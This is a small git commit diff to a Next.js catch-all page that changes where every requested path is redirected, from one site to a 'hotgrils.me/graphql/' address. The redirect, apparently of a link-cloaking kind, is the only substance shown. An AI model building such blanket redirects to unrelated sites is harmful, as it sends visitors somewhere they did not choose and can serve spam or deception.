629ec8d77c62ad416746ca53498a6c8ef6a6cd80
usersuraj002 <122543933+usersuraj002@users.noreply.github.com>
2023-06-09 09:17:07 +0545

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					` https://hotgrils.me/graphql/` + encodeURI(path as string)
 				}`,
 			},
 		};
